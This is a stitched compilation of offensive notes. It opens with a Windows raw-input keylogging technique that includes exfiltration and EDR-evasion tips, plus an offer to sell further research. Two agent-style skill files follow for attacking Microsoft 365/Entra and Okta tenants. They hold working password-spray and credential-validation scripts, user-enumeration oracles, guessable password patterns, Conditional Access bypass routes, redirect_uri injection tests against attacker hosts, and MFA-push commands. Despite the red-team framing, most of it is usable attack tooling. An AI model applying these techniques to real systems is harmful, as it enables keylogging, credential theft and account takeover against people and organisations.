	- ^ only theorical. No EDR implements this afaik
- Mapped or on-disk DLL
	- Is it signed?
		- Memory scanners could detect non-backed-by-disk executable memory.
	- Does it have anything to do here?

---

### NtUserRegisterRawInputDevices / RegisterRawInputDevices

tells the window manager to **deliver raw HID packets** to **one specific HWND** (or to the thread whose queue the window is attached to)

Practical abuse scenario
1. Start a **background thread** in our process or implement a `PeekMessage` / `GetMessage` loop.
2. Create a **zero-sized message-only window** (`HWND_MESSAGE`).
3. Register keyboard raw-input with `RIDEV_INPUTSINK` – > this routes **all keyboard traffic** to our window **even when it is not in the foreground** .
4. Pump the thread’s message queue forever; in the `WM_INPUT` handler call `GetRawInputData` and log the `RAWKEYBOARD` payload.
5. exfil
6. Profit?

Because no hook is installed, this technique:
- does **not** appear in `WinDbg`’s `!hook` list
- leaves **no cross-process DLL mapping**
- is **invisible to most EDR “hook chain” sensors**

this **still requires your process to stay alive and message-aware**, and it **cannot key-log from sessions it is not running in**.

Kernel-mode implementation:
1. Sets an oplock to prevent race conditions
2. Validates parameters
3. `Win32AllocPoolWithQuotaZInit`  
    Allocates a **kernel copy** of the array
4. `RegisterRawInputDevices(v9, a2, 0)`
    Calls the **INTERNAL worker** (see below).  
    It walks the array, updates the **per-thread raw-input hook list**,  
    tells **hidclass** which top-level windows want raw HID traffic, etc.
5. `EtwTraceAuditApiRegisterRawInputDevices`  
    Emits an **ETW** event for **Audit/Threat-Intelligence** so that defenders can see which process just asked for raw keyboard data (keylogger-style activity).
6. Cleanup

The internal worker modifies our process's EPROCESS structure. This makes it so that we can't re-implement this from user-mode.

### IOCs:
- Raises ETW event from kernel-mode win32kfull.sys driver.
	- **NOT AVOIDABLE!**
	- Do AVs/EDRs really monitor it though?
		- Rumors have it that Defender does since 20H1.
	- The ETW payload contains **PID, TID, UsagePage, Usage, Flags** – enough to **trivially score** “key-board raw-input from a non-interactive process” as **suspicious**.
	- Channel is **on by default** and **cannot be disabled** without patching the kernel.  
		→ **This is the strongest IOC** for this technique; **do not discount it**.
- **Raw-input must have a window station and desktop** – the call **fails** (`ERROR_INVALID_WINDOW_HANDLE`) if the thread is **not connected to a desktop**.   Services running in session-0 with **no desktop** therefore **cannot** use this path; they **must** either:  
		– create a **hidden desktop** (logged by **Object Manager auditing**), or
		– open the **\Device\KeyboardClass0** device directly (creates **IRP_MJ_READ** telemetry).
		- Maybe less noisy?
	Both are **easy to alert on**.

---

## Capturing current window's name

To filter for interesting keystrokes you may only monitor keystrokes from Chrome.exe \ firefox.exe, etc.

Different methods of doing that:

### GetWindowTextA
- The most detected function ever, every skid keylogger calls it.
- Eventually wraps around `NtUserInternalGetWindowText`.
- Not much else to say.

### NtUserInternalGetWindowText
- Much less detected because its a very low-level function
- Same signature as **GetWindowTextW**
- Defined in `Win32kFull.sys`.
	- DLL: `win32u.dll`

Reverse-engineering this was very tedious because the only references of this online seem to be:
```C
BOOL InternalGetWindowText(HWND hwnd, LPWSTR pString, int cchMaxCount) {
	DWORD retval = (DWORD)NtUserInternalGetWindowText(hwnd, pString, cchMaxCount);
	if (!retval) {
        *pString = (WCHAR)0;
    }
	return retval
}
```

Consult [1](https://dl.malwarewatch.org/software/features/ntvdmx64/build/nt5docs/d0/d0/ntuser_8h.html), [2](https://dl.malwarewatch.org/software/features/ntvdmx64/build/nt5docs/d9/d8/client_2ntstubs_8c-source.html#l00926) for more

its a syscall so you can use your favorite \*gate technique on it

---

# Novel research

Now... that's all stuff that can be figured out by anyone determined
for the unique research... contact me @ lovestrangekz on tg, everything has a price :]


---
Ideas that were abandonned:
- Use `NtUserBuildHwndList`/`EnumWindows` and re-implement the z-order heuristic to generate the list of all handles to all windows and call IsWindowVisible on them and do some other stuff to figure out if they're foreground or not?
	- Abandonned because, while this works, this is so complex to implement and there's no reliable way of knowing if it's foreground from user-mode (check next point)

- Walk `_K_USER_SHARED_DATA` to query its `ConsoleSessionForegroundProcessId` member then query the system to know that PID's windows and hope it only has one
	- Abandonned because, as above, we can't really know if that window is in foreground,
	- doesn't help much if target PID has multiple window handles

---

lovestrange @ [TeamKavkaz](https://t.me/teamkavkaz25)
join our channel for more
hackerz 4 lyfe


## SOURCE: hunt-skills/m365-entra-attack/SKILL.md

## When to use this skill

Trigger when:
- Target uses M365 / Entra ID (autodiscover.* records, login.microsoftonline.com redirects, "Microsoft Office 365" in tech-stack notes)
- You have a list of corporate emails or stealer-leaked creds
- Engagement involves "credential spray", "password spray", "Entra attack", "ATO via M365"
- You see `*.onmicrosoft.com`, `*-my.sharepoint.com`, `enterpriseregistration.*`, `enterpriseenrollment.*` in recon
- Client mentions "Conditional Access", "MFA bypass", "compliant device"

DO NOT use for:
- On-prem-only Active Directory (use a separate AD-attack skill)
- Service-to-service token attacks (different threat model)
- Phishing-required attack chains (covered by phishing skills) — but you can prep for the credential-validation step here

---

# For each owned domain
msftrecon -d client.example
msftrecon -d clientltd.example
msftrecon -d sister-brand-school.example
```

Key fields in output:
- **Tenant ID** (different domains may share OR have separate tenants — always test all owned domains)
- **Federation Information.Namespace Type** = `Managed` (cloud-only, ROPC works) | `Federated` (ADFS, different attack)
- **SharePoint Detected** (Yes = OneDrive enum vector available)
- **Communication Services Teams/Skype** (post-auth lateral targets)
- **Admin Consent Endpoint accessible** (consent-phishing surface)

**Red flag:** if the org has multiple Entra tenants for sister domains, each is a separate attack surface with its own user list, lockout policy, and CA configuration. Don't assume one spray covers all.

---

## AADSTS code reference (memorize)

| AADSTS | Meaning | Lockout impact | What to do |
|---|---|---|---|
| 50034 | User does not exist | None | Skip; remove from spray list |
| 50126 | Invalid username/password | +1 attempt counter | User exists — try alternate password later (within cap) |
| 50053 | Account locked (Smart Lockout) | None (already locked) | Pre-existing → flag to SOC; don't retry |
| 53003 | CA blocked token issuance | +1 attempt counter | **PASSWORD VALID** — STOP, password is correct |
| 50076 | MFA required | +1 attempt counter | **PASSWORD VALID** — second factor needed |
| 50079 | Strong auth required | +1 attempt counter | **PASSWORD VALID** — same as 50076 |
| 50158 | External auth required | +1 attempt counter | **PASSWORD VALID** — federated MFA |
| 530003 | Device-state required | +1 attempt counter | **PASSWORD VALID** — needs compliant device |
| 65001 | Consent required | +1 attempt counter | App-consent issue, not auth |
| 700016 | App not in tenant | None | User in different tenant — adjust target |
| 90002 | Tenant does not exist | None | Tenant typo / dead tenant |

**Critical insight:** any code in {53003, 50076, 50079, 50158, 530003} means **the password is correct** — Microsoft only returns these AFTER successful credential validation. Document as a confirmed-valid finding even if you can't get a token.

---

## Smart Lockout math (the cap discipline)

**Microsoft default policy:**
- 10 failed sign-ins in 10 minutes → 1-minute lockout
- 20 failed sign-ins → progressively longer lockouts (exponential backoff)
- Counter shared across **ALL auth flows** (ROPC + SAML + IMAP + EWS + SMTP + device-code)

**Engagement discipline:**
- Hard cap: ≤2 password attempts per user **lifetime per engagement** (some engagements: 1)
- State file with atomic writes — never let two test runs race the counter
- Kill switch: stop run if more than N LOCKED responses observed (suggests pre-existing attacker activity OR you miscounted; either way pause)

**Mathematical guarantee:** with 1 attempt per user, **you cannot cause Smart Lockout** (1 < 10). Any AADSTS50053 you see is therefore pre-existing → use this for active-attacker detection (see `mid-engagement-ir-detection` skill).

---

### ❌ HARDENED (no longer differential)

```http
GET /getuserrealm.srf?login=<email>&xml=1
```
Returns identical XML for any email matching tenant's owned domain. **Tenant-level only, not user-level.**

```http
POST /common/GetCredentialType
{"username":"<email>", "isOtherIdpSupported":true, ...}
```
Returns `AADSTS1659001` (missing flowToken) without proper session — can't enumerate.

```http
GET /autodiscover/autodiscover.json/v1.0/<email>?Protocol=AutodiscoverV1
```
Returns identical 200 + same JSON body for any address. Hardened ~2024.

### ✅ STILL WORKS (May 2026 — track shelf life)

**OneDrive personal-site differential:**
```http
GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx HTTP/1.1
Host: <tenant>-my.sharepoint.com
```
- **302 → user EXISTS** (auth-required redirect to Authenticate.aspx)
- **404 → user does NOT exist** (404 FILE NOT FOUND)
- ZERO authentication attempt → ZERO lockout impact
- Bonus: `Sprequestduration` header faster (~40ms) for existing users vs ~600ms for non-existent — secondary timing oracle

**Caveats:**
- Only works if SharePoint is provisioned for the tenant (check msftrecon `SharePoint Detected: Yes`)
- Microsoft is hardening these endpoints over time — re-verify before relying on it
- Some users may exist in Entra without OneDrive provisioning (license-dependent) — false negatives possible

**2026-05-17 re-verification (authorized-engagement revalidation):** The OneDrive enum primitive STILL WORKS as of 2026-05-17. Calibration: licensed users return HTTP 200 with ~57KB body; nonexistent users / shared-mailbox accounts return 404 with 0 bytes. The /personal/ root path (without /_layouts/15/onedrive.aspx) returns the same differential.

**Killer use case: license differential = account-class signal.** Cross-reference OneDrive 200/404 with ROPC AADSTS50034/50126:

| OneDrive | ROPC | Classification |
|---|---|---|
| 200 | AADSTS50076 (MFA req) or 50126 | **Licensed regular user** (real employee, MFA enforced) |
| 200 | AADSTS50034 | (shouldn't happen — inconsistency, investigate) |
| 404 | AADSTS50126 | **Shared mailbox / functional / service account** (no OneDrive license, has password) — historic MFA-exempt class, prime target for password guessing |
| 404 | AADSTS50034 | Doesn't exist in tenant |
| 404 | AADSTS50076 | Edge case (functional account WITH MFA enforced — rare) |

The OneDrive-404 + ROPC-50126 combination is **the signal for "functional account that might bypass MFA"** — admins frequently exempt these from CA policies because they're used by automation that can't satisfy MFA. Discovered usefulness on authorized-engagement revalidation: identified `noreply@`, `purchase@`, `accounts@`, `postmaster@`, `transport@` as functional-account candidates (typical for any conglomerate tenant).

**ROPC AADSTS50034 / AADSTS50126 differential:**
- AADSTS50034 (user not exist) does NOT increment Smart Lockout counter
- AADSTS50126 (wrong password) DOES increment
- So a 1-attempt-per-user spray can be used as a coarse user-existence enumerator (each AADSTS50034 = miss, each AADSTS50126 = hit + 1 attempt burned)

---

## Conditional Access bypass options (most blocked, document anyway)

| Vector | Status (2026) | Notes |
|---|---|---|
| Different ROPC client_id (Microsoft Graph PowerShell vs Azure CLI vs Office) | Sometimes works | CA can be per-app; try `1b730954-1685-4b74-9bfd-dac224a7b894` (Graph PS), `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI), `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Office) |
| Different resource (graph.microsoft.com / outlook.office.com / management.azure.com) | Sometimes works | CA scope can be per-resource |
| EWS / IMAP / POP3 / SMTP Basic Auth | Mostly disabled | MS deprecated Basic Auth Oct 2022; per-account exceptions exist |
| FOCI (Family of Client IDs) | Token-refresh path | Use a refresh token from one FOCI client to mint tokens for another |
| Device-code phishing | Works | Requires user-side interaction (OOS for many engagements) |
| Compliant-device emulation | Hard | Requires Intune device registration — high effort, often impossible without insider |
| AiTM session-cookie steal | Works (with phishing) | Modern primary technique — out of scope for non-phishing engagements |
| FOCI + Family Refresh Token Theft | Post-auth | Requires already having a token |
| SAML SSO via different SP | Sometimes | Each enterprise app has its own CA policy; an app with weaker CA = pivot |
| Geo-bypass via VPN | Sometimes | If "trusted location" CA policy includes corp HQ IPs, use a VPN exit there |

**Key insight from this engagement:** in a tenant with universal CA policy (compliant device + MFA), all the above paths return AADSTS53003 with the same flow. The cred is valid, but unusable from external. **Phishing-completed cookie steal is the only realistic adversary path.** Document this clearly so the client understands the threat model.

---

## ROPC password validation (the canonical test)

**Single-attempt validator pattern (Python):**

```python
import urllib.request, urllib.parse, ssl, time, json, os
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
ATTEMPT_FILE = "engagement_log/o365_attempts.json"
HARD_CAP = 1  # or 2 — never higher

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    state[email.lower()] = state.get(email.lower(), 0) + 1
    json.dump(state, open(ATTEMPT_FILE+".tmp", "w"))
    os.replace(ATTEMPT_FILE+".tmp", ATTEMPT_FILE)  # atomic
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body, method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=15)
        body = json.loads(r.read())
        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
        if "access_token" in body:    # ← JSON key check, NOT substring
            return {"status": "VALID", "body": body}
        return {"status": "STATUS_200_NO_TOKEN", "body": body}
    except urllib.error.HTTPError as e:
        msg = e.read().decode(errors="ignore")
        for code, status in [
            ("AADSTS50034", "INVALID_USER"),
            ("AADSTS50126", "INVALID_PW"),
            ("AADSTS50053", "LOCKED"),
            ("AADSTS53003", "VALID_CA_BLOCK"),
            ("AADSTS50076", "VALID_MFA"),
            ("AADSTS50079", "VALID_MFA"),
        ]:
            if code in msg:
                return {"status": status, "code": code}
        return {"status": "OTHER", "msg": msg[:200]}
```

### ⚠ CRITICAL TRAP — AADSTS50076 body contains literal `"access_token"` substring

When CA policy requires MFA and ROPC cannot satisfy it, Entra returns an error body that INCLUDES a `claims` field listing CA policy IDs as a step-up challenge:

```json
{
  "error": "invalid_grant",
  "error_description": "AADSTS50076: ...you must use multi-factor authentication...",
  "error_codes": [50076],
  "suberror": "basic_action",
  "claims": "{\"access_token\":{\"capolids\":{\"essential\":true,\"values\":[\"<policy-id-1>\",\"<policy-id-2>\"]}}}"
}
```

**The `"access_token"` substring appears inside the CA claims challenge JSON.** A loose substring check `if "access_token" in raw_body:` will false-positive every MFA-blocked attempt as a successful token issuance.

**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This was discovered in the 2026-05-17 authorized-engagement revalidation where a substring check produced 7 false-positive "CA bypasses" on Sway/Yammer/Bookings/Tunnel client_ids that were actually all enforcing MFA correctly.

The `claims.access_token.capolids` values are tenant-internal Conditional Access policy IDs — useful recon enrichment, but NOT a token. Document them in engagement notes as "CA policy IDs that fired" — they're a defender-side breadcrumb, not an attacker-side win.

**Pace:**
- **NEVER use concurrency. Single-threaded, serial, paced. This is a hard rule, not a tuning knob.** Entra has an IP-reputation anti-spray layer that is SEPARATE from per-user Smart Lockout. Concurrency — not attempts-per-user — is what trips it. Once tripped it returns `AADSTS50053` (LOCKED) en masse for accounts you hit only once (mathematically impossible to be real per-user locks → they are IP-level rejections), which (a) **contaminates your existence data** — 50053 is now ambiguous and you've burned the 1/user cap so you can't re-test — and (b) **flags your egress IP as a spray source** in the tenant. Observed live on an authorized engagement: switching from serial to 12 threads produced ~183 false `AADSTS50053` in 15s vs. 1 across 454 paced attempts.
- The earlier "≤30 req/sec is fine" guidance is MISLEADING for a real tenant — read it as "serial with 1.5–3s jitter," never as "parallelize up to 30/s."
- Per-user: hard cap from state file is the only thing that matters for lockout-causation; serial pacing is what matters for IP reputation.
- Random jitter (1.5–5s between attempts) for less-machine-like signature.
- **Kill-switch:** if >~5 `AADSTS50053` appear in a run where your cap is 1/user, STOP — you've either tripped IP anti-spray (your fault, pace down / rotate IP / wait for cooldown) or detected a real external spray (a finding). Either way, pause and diagnose before continuing.

---

## SAML SSO browser flow (for definitive cred validation when CA blocks ROPC)

When ROPC returns AADSTS53003, you've proven the password. To prove it across BOTH auth paths (and capture Microsoft's CA-block page as evidence), walk SAML SSO via Playwright:

```python
import asyncio
from playwright.async_api import async_playwright

async def saml_validate(target_sp_url, username, password, screenshot_dir):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        # Step 1: navigate to SP
        await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
        # Step 2: click sign-in (selectors vary per SP)
        for sel in ["button:has-text('Sign in')", "a:has-text('Login')", "button:has-text('Azure')"]:
            try:
                await page.locator(sel).first.click(timeout=3000)
                break
            except: continue
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 3: submit username at Microsoft
        await page.locator('input[name="loginfmt"], input[type="email"]').first.fill(username)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 4: submit password
        await page.locator('input[name="passwd"], input[type="password"]').first.fill(password)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=30000)
        # Step 5: capture
        await page.screenshot(path=f"{screenshot_dir}/saml_final.png", full_page=True)
        content = await page.content()
        cookies = await context.cookies()
        await browser.close()
        # Check outcome
        low = content.lower()
        if "convergedconditionalaccess" in low or "53003" in low:
            return "CA_BLOCKED"  # cred valid, CA wall
        elif "verify your identity" in low or "approve sign in" in low:
            return "MFA_REQUIRED"  # cred valid, MFA wall
        elif "we couldn't sign you in" in low or "wrong" in low:
            return "INVALID"
        elif "<post-auth-landing-marker>" in low or "dashboard" in low:
            return "FULL_SUCCESS"  # session obtained (replace marker per target app)
        return "UNCLEAR"
```

Microsoft's `ConvergedConditionalAccess` page (PageID in source) is the definitive evidence of CA-block.

---

## Active-attacker detection via lockout differential

If you see `AADSTS50053` (LOCKED) on multiple users despite your 1-attempt-per-user cap:
1. **You did not cause these locks** (math: 1 < 10).
2. **An external attacker is actively spraying the tenant.**
3. **Cluster the locked users alphabetically — if they cluster, attacker is using a sorted username list.**
4. **Diff lockout count between spray-start and spray-end** — new locks during your session = attacker is active *right now*.
5. **Document the locked email list as a finding** (SOC actionable — they pull sign-in logs for those users).

This is the **highest-impact byproduct** of any M365 spray engagement. Always track and report.

---

## Common password patterns to spray (multi-brand enterprise targets)

- `<BrandName>@<Year>` — `<Brand>@2026`, `Tata@2026`
- `<BrandName>@123` — `<Brand>@123` (very common)
- `<PlantCity>@<Year>` — `<City1>@2026`, `<City2>@2026` (production plant cities)
- `<EmployeeID-as-password>` — common in legacy apps (PAN number, employee code, phone last4)
- `Password@<year>`, `Welcome@<year>`, `Admin@<year>` — generic defaults
- `<BrandName>@<Y2-digits>` — `<Brand>@26`

**Engagement caveat:** when client provides leaked-cred dumps (stealer logs), use those FIRST. Each leaked cred is 1 cap-attempt against the strongest known guess for that user.

---

## Engagement journaling (mandatory)

Every M365 attempt logs to JSONL:
```json
{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
```

**Per-user tracker** (atomic):
```json
{"user1@<client>.example": 1, "user2@<client>.example": 1, ...}
```

**IP rotation log** (per-day):
```
2026-05-08	<src-ip>	<ISP-AS>	<operator-handle>	Round 2 spray
```

These three artifacts are deliverable evidence for the report. They survive into the next engagement as state.

---

## Real-world findings template (from authorized-engagement)

For the report:

**Finding: 261 Entra accounts in pre-existing lockout state**
- Subject: Active external password-spray campaign detected
- Evidence: `o365_results.jsonl` filtered to `status=LOCKED`
- Math: 1-attempt-per-user × 261 LOCKED ≠ our doing
- SOC action: pull sign-in logs for these 261 accounts over last 30-60 days

**Finding: Valid M365 cred — `<user>:<password>` (CA-blocked)**
- Subject: Confirmed valid credential
- Evidence: ROPC AADSTS53003 + SAML SSO `ConvergedConditionalAccess` page screenshot
- Microsoft documentation excerpt: "AADSTS53003 returned only after password validation"
- Recommendation: force password reset, audit org-wide for similar pattern

---

## Anti-patterns (don't do these)

- **DON'T use the leaked cred for the user across multiple resources** — burns the cap with no marginal benefit when CA blocks all paths
- **DON'T retry after AADSTS50053** — account is locked, you'll just see lockout again
- **DON'T parallelize ROPC/auth requests AT ALL** — serial + paced only. Concurrency trips Entra's IP-reputation anti-spray (separate from Smart Lockout), floods false `AADSTS50053`, contaminates results, and flags your IP. "Going faster" by adding threads costs more than it saves. The only safe speed-up is removing dead/nonexistent users first (small `GetCredentialType` batches <60), not raising concurrency.
- **DON'T forget to test ALL Entra tenants** — sister domains often have separate tenants with different password policies
- **DON'T retract a CA-block finding** — AADSTS53003 means the password is correct; that's the whole point

---

## Tooling

```bash
pip install --break-system-packages msftrecon o365spray  # may need to clone msftrecon from GitHub
brew install pandoc                                       # for report generation
go install -v github.com/projectdiscovery/...             # PD toolkit for general recon
```

Pre-built `m365_validator.py` template at engagement working directory `engagement_log/m365_validator.py`. Adapt the `attempt()` function to your engagement.

---

## Related Skills & Chains

- **`hunt-mfa-bypass`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
- **`hunt-ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
- **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
- **`hunt-saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `hunt-saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
- **`redteam-report-template`** — M365 findings need clear tenant/user/CA-policy framing because the blast radius is "every Microsoft service the org uses." Chain primitive: validated finding from this skill → run through `triage-validation` 7-Question Gate → package via `redteam-report-template` with explicit blast-radius (which apps, which users, which data) for client deliverable.


## SOURCE: hunt-skills/okta-attack/SKILL.md

## When to use this skill

Trigger when:
- DNS shows `<tenant>.okta.com` or `<tenant>.okta-emea.com` (EMEA region)
- Login flow redirects to `<tenant>.okta.com/login` or `/app/<app_id>/sso/saml`
- Web pages reference `/signin/customize`, `oktapreview.com`, or `auth-js-sdk`
- Recon notes "uses Okta for SSO"
- A target has `*.okta.com` SAN in TLS cert
- Identity-fabric mapping returns Okta as IdP for a corporate app

DO NOT use for:
- Entra ID (use `m365-entra-attack` instead)
- Google Workspace (use `google-workspace-attack` — not yet built)
- ADFS (different protocol, on-prem)

---

# Replace these with your target's actual tenant slug candidates:
for tenant in target-brand target-brand-ltd target-sister-brand target-brand-short target-other-variant; do
  for region in okta okta-emea oktapreview; do
    host="$tenant.$region.com"
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://$host/")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $host  $code"
  done
done
```

# Replace with your target's actual domains:
for domain in client.example client-ltd.example; do
  dig +short "sso.$domain" CNAME
  dig +short "login.$domain" CNAME
  dig +short "auth.$domain" CNAME
  dig +short "okta.$domain" CNAME
done
```

# Visit corporate-app login, follow redirects
curl -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"

### Method 1 — `/api/v1/authn` differential
The auth API returns different errors for invalid users vs invalid passwords. Slightly differential.

```bash

# Probe single user — DON'T spray, this counts as auth attempt!
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<email>","password":"_test_invalid_pw"}'

#   401 + "errorCode":"E0000004" → invalid credentials (user exists OR doesn't — Okta unifies these)

#   200 + "status":"SUCCESS" → full auth (rare in modern setups)
```

⚠ Okta has hardened against direct user-existence enum via `/api/v1/authn` — error message is typically uniform "Authentication failed". User enumeration via this endpoint is unreliable in 2024+.

### Method 2 — `/api/v1/users/me/factors` timing
Some flows expose user existence via response time differential. Less reliable than M365 OneDrive technique.

### Method 3 — Sign-in widget JS endpoint
```bash
curl -sk "https://<tenant>.okta.com/api/v1/sessions/me" \
  -H "Accept: application/json"

### Method 4 — Org-specific identifier probing
Some Okta orgs use email-as-username; others use `firstname.lastname` or employee-id. Test pattern guesses:
```
firstname.lastname@target.com
firstname_lastname@target.com  
flastname@target.com
employeeID@target.com
```

# Tampering with login_hint param can reveal user existence on some configs
curl -skI "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<id>&response_type=code&scope=openid&redirect_uri=https://example.com&login_hint=<email>"

# Initial auth — observe what factors come back
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<valid_user>","password":"_test_invalid_pw"}' | python3 -m json.tool
```

Response structure reveals factor configuration:
```json
{
  "stateToken": "00ABC...",
  "factorResult": "WAITING",
  "status": "MFA_REQUIRED",
  "_embedded": {
    "factors": [
      {"factorType": "push", "provider": "OKTA"},
      {"factorType": "token:software:totp", "provider": "OKTA"},
      {"factorType": "sms", "provider": "OKTA"},
      {"factorType": "call", "provider": "OKTA"},
      {"factorType": "email", "provider": "OKTA"},
      {"factorType": "question", "provider": "OKTA"},
      {"factorType": "webauthn", "provider": "FIDO"}
    ]
  }
}
```

**Critical insight:** the factor list reveals which factors are available — phishing-resistance varies dramatically:
- `webauthn` (FIDO2) — phishing-resistant
- `question` (security questions) — extremely weak; KBA attacks
- `sms` / `call` — phishing-able (push notification fatigue, SIM swap)
- `push` — phishing-able via MFA fatigue
- `email` — phishing-able if attacker has email read access
- `totp` — phishing-able via AiTM

---

### Lockout policy
Okta default: **10 failed sign-ins → lockout** (configurable per-org). Some orgs configure much stricter (3 fails).

Discipline:
- ≤2 attempts per user lifetime per engagement (safer than 1 in Entra because Okta lockout is sometimes 3 fails)
- Track per-user in atomic state file
- Stop on first valid hit OR if LOCKED rate exceeds threshold

### Status codes to watch for
| Response | Meaning |
|---|---|
| `200 status=MFA_REQUIRED` | **Password is VALID** — MFA challenge waiting |
| `200 status=SUCCESS + sessionToken` | Full auth (only if MFA not required for this user) |
| `200 status=PASSWORD_EXPIRED` | **Password is VALID** but user must change it |
| `200 status=LOCKED_OUT` | Account locked (pre-existing or our cause) |
| `401 E0000004` | Authentication failed (user doesn't exist OR wrong password — Okta unifies) |
| `401 E0000119` | User is locked |
| `429` | Rate-limit hit |

---

## Push-notification fatigue (MFA bombing)

If a valid password is obtained and `push` factor is available, the classic attack: hammer the push factor until the user accepts out of fatigue.

⚠ **OUT OF SCOPE in most red-team engagements** (counts as social engineering / phishing — e.g. phishing was explicitly OOS for authorized-engagement). Document the vector existence but do not execute without explicit sign-off.

# Initiate factor verification
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn/factors/<factor_id>/verify" \
  -H "Content-Type: application/json" \
  -d '{"stateToken":"<from_authn>"}'

## OIDC redirect_uri tampering

Okta OIDC apps often have a list of allowed `redirect_uri` values. Misconfigurations:

```bash

# Get the app's authorize endpoint
curl -sk "https://<tenant>.okta.com/.well-known/openid-configuration" | python3 -m json.tool

# Test redirect_uri injection
for ruri in \
    "https://attacker.example.com/" \
    "https://target.com.attacker.com/" \
    "https://target.com@attacker.com/" \
    "https://target.com#@attacker.com/" \
    "https://target.com\\@attacker.com/" \
    "//attacker.com/" \
    "https://target.com/cb?next=https://attacker.com/"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<client>&response_type=code&scope=openid&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$ruri'))")")
  echo "  $ruri → $code"
done

# Any 302 with the attacker URL in Location header = open redirect → auth-code theft chain
```

---

## SAML SP misconfiguration check (per-app)

Each Okta SAML app has its own SP metadata:

```bash

# Iterate known app IDs (find via the org's app list — usually in JS bundles or initial login redirects)
curl -sk "https://<tenant>.okta.com/app/<app_id>/sso/saml/metadata"

## Okta Admin API (post-cred-compromise)

If a valid cred + MFA-completed token is obtained:

```bash

# Get session token
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -d '{"username":"...","password":"..."}'

# Test admin endpoints (all require valid SSWS token):
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/users"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/groups"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/apps"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/logs"      # audit log
```

---

## Okta-specific phishing kits (informational — OOS for non-phishing engagements)

- **EvilProxy** — Okta-aware AiTM kit
- **Modlishka** — generic AiTM
- **Evilginx2** — has Okta phishlets

Document existence; do not deploy without explicit phishing scope.

---

## FastPass / Okta Verify abuse

Okta FastPass is push-based + device-bound. Bypasses:
- Device trust spoofing (requires kit + endpoint compromise — internal-only)
- Push fatigue (see above)
- Phishing redirect to fake FastPass prompt

---

## Common Okta tenant configuration patterns

| Indicator | Configuration |
|---|---|
| `<tenant>.okta.com/api/v1/iam/orgs` returns 401 (not 404) | API IAM endpoints enabled — admin attack surface |
| `customize/sign-in` page reachable anon | Tenant brand customization is public — useful intel |
| Multiple `*.okta.com` SAN certs | Multi-tenant org (less common) |
| `oktapreview.com` subdomain | Preview/sandbox tenant — typically weaker security |

---

## Tooling

- **`OktaTerrify`** (github.com/silverhack/OktaTerrify) — post-compromise Okta device-trust / FastPass enumeration. The only verifiable public Okta-specific offensive tool; no other named, maintained "okta-attacker"/"okta-toolkit" utility is verifiable — build engagement-specific scripts against `/api/v1/*` instead of citing unverified tool names.

---

## Anti-patterns

- **DO NOT use Entra-style spray pace on Okta** — Okta's anti-automation is tuner-different; rate-limit hits faster
